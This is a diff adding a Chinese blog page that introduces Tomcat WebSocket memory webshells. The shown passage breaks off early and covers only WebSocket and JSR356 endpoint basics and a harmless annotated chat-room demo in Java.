@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/image/favicons/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/image/favicons/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/image/favicons/favicon-16x16.png">
+  <link rel="mask-icon" href="/image/favicons/favicon.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"paoka1.top","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"default"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="对 Tomcat WebSocket 型内存马的介绍">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tomcat WebSocket 型内存马">
+<meta property="og:url" content="https://paoka1.top/2023/04/21/Tomcat-WebSocket-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="Paoka1&#39;s Blog">
+<meta property="og:description" content="对 Tomcat WebSocket 型内存马的介绍">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/04/Apache_Tomcat_logo.svg.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/04/Demo.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/04/HSDB.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/04/Find.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/04/Info.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/04/Clear.png">
+<meta property="article:published_time" content="2023-04-21T13:15:25.000Z">
+<meta property="article:modified_time" content="2026-01-04T12:33:44.981Z">
+<meta property="article:author" content="Paoka1">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="内存马">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://paoka1.top/image/post/2023/04/Apache_Tomcat_logo.svg.png">
+
+
+<link rel="canonical" href="https://paoka1.top/2023/04/21/Tomcat-WebSocket-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://paoka1.top/2023/04/21/Tomcat-WebSocket-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/","path":"2023/04/21/Tomcat-WebSocket-型内存马/","title":"Tomcat WebSocket 型内存马"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Tomcat WebSocket 型内存马 | Paoka1's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Paoka1's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome to my blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#WS-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">WS 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WS-%E5%AE%9E%E7%8E%B0"><span class="nav-number">2.</span> <span class="nav-text">WS 实现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B"><span class="nav-number">3.</span> <span class="nav-text">加载过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80"><span class="nav-number">4.</span> <span class="nav-text">内存马查杀</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Paoka1"
+      src="/image/favicons/favicon.ico">
+  <p class="site-author-name" itemprop="name">Paoka1</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/paoka1" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;paoka1" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:shauio@163.com" title="E-Mail → mailto:shauio@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://paoka1.top/2023/04/21/Tomcat-WebSocket-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/image/favicons/favicon.ico">
+      <meta itemprop="name" content="Paoka1">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paoka1's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Tomcat WebSocket 型内存马 | Paoka1's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Tomcat WebSocket 型内存马
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-04-21 21:15:25" itemprop="dateCreated datePublished" datetime="2023-04-21T21:15:25+08:00">2023-04-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-01-04 20:33:44" itemprop="dateModified" datetime="2026-01-04T20:33:44+08:00">2026-01-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java-%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java 安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>对 Tomcat WebSocket 型内存马的介绍</p>
+<center><img src="/image/post/2023/04/Apache_Tomcat_logo.svg.png"></center>
+
+<span id="more"></span>
+
+<h3 id="WS-前言"><a href="#WS-前言" class="headerlink" title="WS 前言"></a>WS 前言</h3><p>WebSocket 是一种全双工通信协议，即客户端可以向服务端发送请求，服务端也可以主动向客户端推送数据。这样的特点，使得它在一些实时性要求比较高的场景效果斐然（比如微信朋友圈实时通知、在线协同编辑等），主流浏览器以及一些常见服务端通信框架（Tomcat、Spring、Jetty、WebSphere、WebLogic 等）都对 WebSocket 进行了技术支持，本文都以 Tomcat 进行介绍讨论，其他框架也可实现 WebSocket 内存马</p>
+<p>2013 年以前还没出 JSR356 标准，Tomcat 就对 Websocket 做了支持，自定义 API，再后来有了 JSR356，Tomcat 立马紧跟潮流，废弃自定义的 API，实现 JSR356 那一套，这就使得在<code>Tomcat7.0.47</code>之后的版本和之前的版本实现方式并不一样，接入方式也改变了，JSR356 是 Java 制定的 Websocket 编程规范，属于 Java EE 7 的一部分，所以要实现 Websocket 功能并不需要任何第三方依赖</p>
+<p>根据 JSR356 规定， 建立 WebSocket 连接的服务器端和客户端，两端对称，可以互相通信。把通信端点抽象成类，就是<code>Endpoint</code>，每一个 Endpoint 对象代表 WebSocket 链接的一端，服务器端的叫<code>ServerEndpoint</code>，客户端的叫<code>ClientEndpoint</code>。客户端向服务端发送 WebSocket 握手请求，建立连接后就创建一个<code>ServerEndpoint</code>对象</p>
+<h3 id="WS-实现"><a href="#WS-实现" class="headerlink" title="WS 实现"></a>WS 实现</h3><p>ServerEndpoint 和 ClientEndpoint，有相同的生命周期事件（OnOpen、OnClose、OnError、OnMessage），不同之处是 ServerEndpoint 作为服务器端点，可以指定一个 URI 路径供客户端连接，ClientEndpoint 则没有，Endpoint 对象的生命周期方法如下：</p>
+<ul>
+<li>onOpen：当开启一个新的会话时调用。这是客户端与服务器握手成功后调用的方法，等同于注解<code>@OnOpen</code></li>
+<li>onClose：当会话关闭时调用。等同于注解<code>@OnClose</code></li>
+<li>onError：当链接过程中异常时调用。等同于注解<code>@OnError</code></li>
+<li>onMessage：接收到消息时触发。等同于注解<code>@OnMessage</code></li>
+</ul>
+<p>服务器端的<code>Endpoint</code>有两种实现方式，一种是注解方式<code>@ServerEndpoint</code>，一种是继承抽象类<code>Endpoint</code></p>
+<ol>
+<li><p>使用注解实现：</p>
+<p><strong>一个<code>@ServerEndpoint</code>注解应该有以下元素：</strong></p>
+<ul>
+<li><code>value</code>：必要，String 类型，此 Endpoint 部署的 URI 路径</li>
+<li><code>configurator</code>：非必要，继承<code>ServerEndpointConfig.Configurator</code>的类，主要提供 ServerEndpoint 对象的创建方式扩展（如果使用 Tomcat 的 WebSocket 实现，默认是反射创建 ServerEndpoint 对象）</li>
+<li><code>decoders</code>：非必要，继承 Decoder 的类，用户可以自定义一些消息解码器，比如通信的消息是一个对象，接收到消息可以自动解码封装成消息对象</li>
+<li><code>encoders</code>：非必要，继承 Encoder 的类，此端点将使用的编码器类的有序数组，定义解码器和编码器的好处是可以规范使用层消息的传输</li>
+<li><code>subprotocols</code>：非必要，String 数组类型，用户在 WebSocket 协议下自定义扩展一些子协议</li>
+</ul>
+<p>例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ServerEndpoint(value=&quot;/ws/&#123;userId&#125;&quot;, encoders=&#123;MessageEncoder.class&#125;, decoders=&#123;MessageDecoder.class&#125;, configurator=MyServerConfigurator.class)</span></span><br></pre></td></tr></table></figure>
+
+<p><code>@ServerEndpoint</code>可以注解到任何类上，<strong>但是想实现服务端的完整功能，还需要配合几个生命周期的注解使用，这些生命周期注解只能注解在方法上：</strong></p>
+<ul>
+<li><p><code>@OnOpen</code>建立连接时触发</p>
+</li>
+<li><p><code>@OnClose</code>关闭连接时触发</p>
+</li>
+<li><p><code>@OnError</code>发生异常时触发</p>
+</li>
+<li><p><code>@OnMessage</code>接收到消息时触发</p>
+</li>
+</ul>
+</li>
+<li><p>集成抽象类实现：</p>
+<p>继承抽象类<code>Endpoint</code>，重写几个生命周期方法，实现两个接口，比加注解 <code>@ServerEndpoint</code>方式更麻烦，其中重写<code>onMessage</code>需要实现接口<code>jakarta.websocket.MessageHandler</code>，给 Endpoint 分配 URI 路径需要实现接口<code>jakarta.websocket.server.ServerApplicationConfig</code>，而<code>URI path</code>、<code>encoders</code>、<code>decoders</code>、<code>configurator</code>等配置信息由<code>jakarta.websocket.server.ServerEndpointConfig</code>管理，默认实现<code>jakarta.websocket.server.DefaultServerEndpointConfig</code>，通过编程方式实现 Endpoint，比如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServerEndpointConfig</span> <span class="variable">serverEndpointConfig</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(WebSocketServerEndpoint3.class, <span class="string">&quot;/ws/&#123;userId&#125;&quot;</span>).decoders(decoderList).encoders(encoderList).configurator(<span class="keyword">new</span> <span class="title class_">MyServerConfigurator</span>()).build();</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>下面基于注解编写一个 WebSocket 的聊天室，依赖（我的环境是 JDK8u341 + Tomcat 8.5.84）：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javaee-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.84<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-websocket<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.84<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>类 demo：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> WebSocket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.CopyOnWriteArraySet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.websocket.*;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @ServerEndpoint 注解是一个类层次的注解，它的功能主要是将目前的类定义成一个 WebSocket 服务器端</span></span><br><span class="line"><span class="comment">// 注解的值将被用于监听用户连接的终端访问 URL 地址，客户端可以通过这个 URL 来连接到 WebSocket 服务器端</span></span><br><span class="line"><span class="meta">@ServerEndpoint(&quot;/websocket&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="comment">// 静态变量，用来记录当前在线连接数，应该把它设计成线程安全的</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">onlineCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// concurrent 包的线程安全 Set，用来存放每个客户端对应的 demo 对象</span></span><br><span class="line">    <span class="comment">// 若要实现服务端与单一客户端通信的话，可以使用 Map 来存放，其中 Key 可以为用户标识</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> CopyOnWriteArraySet&lt;demo&gt; webSocketSet = <span class="keyword">new</span> <span class="title class_">CopyOnWriteArraySet</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 与某个客户端的连接会话，需要通过它来给客户端发送数据</span></span><br><span class="line">    <span class="keyword">private</span> Session session;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接建立成功调用的方法</span></span><br><span class="line">    <span class="comment">// session 可选的参数，session 为与某个客户端的连接会话，需要通过它来给客户端发送数据</span></span><br><span class="line">    <span class="meta">@OnOpen</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(Session session)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.session = session;</span><br><span class="line">        <span class="comment">// 加入 set 中</span></span><br><span class="line">        webSocketSet.add(<span class="built_in">this</span>);</span><br><span class="line">        <span class="comment">// 在线数加 1</span></span><br><span class="line">        addOnlineCount();</span><br><span class="line">        System.out.println(<span class="string">&quot;有新连接加入！当前在线人数为&quot;</span> + getOnlineCount());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接关闭调用的方法</span></span><br><span class="line">    <span class="meta">@OnClose</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClose</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 从 set 中删除</span></span><br><span class="line">        webSocketSet.remove(<span class="built_in">this</span>);</span><br><span class="line">        <span class="comment">// 在线数减 1</span></span><br><span class="line">        subOnlineCount();</span><br><span class="line">        System.out.println(<span class="string">&quot;有一连接关闭！当前在线人数为&quot;</span> + getOnlineCount());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 收到客户端消息后调用的方法</span></span><br><span class="line">    <span class="comment">// message 客户端发送过来的消息，session 可选的参数</span></span><br><span class="line">    <span class="meta">@OnMessage</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String message, Session session)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;来自客户端的消息:&quot;</span> + message);</span><br><span class="line">        <span class="comment">// 群发消息</span></span><br><span class="line">        <span class="keyword">for</span>(demo item: webSocketSet) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                item.sendMessage(message);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发生错误时调用</span></span><br><span class="line">    <span class="meta">@OnError</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onError</span><span class="params">(Session session, Throwable error)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;发生错误&quot;</span>);</span><br><span class="line">        error.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这个方法与上面几个方法不一样。没有用注解，是根据自己需要添加的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendMessage</span><span class="params">(String message)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.session.getBasicRemote().sendText(message);</span><br><span class="line">        <span class="comment">// this.session.getAsyncRemote().sendText(message);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getOnlineCount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> onlineCount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">addOnlineCount</span><span class="params">()</span> &#123;</span><br><span class="line">        demo.onlineCount++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">subOnlineCount</span><span class="params">()</span> &#123;</span><br><span class="line">        demo.onlineCount--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对应的 JSP 文件：</p>
